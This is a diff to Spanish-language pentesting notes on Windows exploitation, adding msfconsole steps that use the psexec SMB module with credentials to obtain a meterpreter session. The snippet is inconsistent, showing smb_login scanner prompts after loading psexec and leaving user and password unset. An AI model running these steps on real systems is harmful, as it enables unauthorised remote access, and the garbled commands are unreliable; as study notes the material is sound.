@@ -37,4 +37,15 @@ Password: pass
 C:\Windows\system32>
 ```
 
+**Usando el módulo de metasploit para obtener una sesión meterpreter**
+
+```bash
+msf > use exploit/windows/smb/psexec
+msf auxiliary(scanner/smb/smb_login) > set rhosts <IP>
+msf auxiliary(scanner/smb/smb_login) > set smbuser
+msf auxiliary(scanner/smb/smb_login) > set smbpass
+msf auxiliary(scanner/smb/smb_login) > exploit
+meterpreter > 
+```
+
 [⟵ Anterior](../../05_sistema.md#explotación-windows)
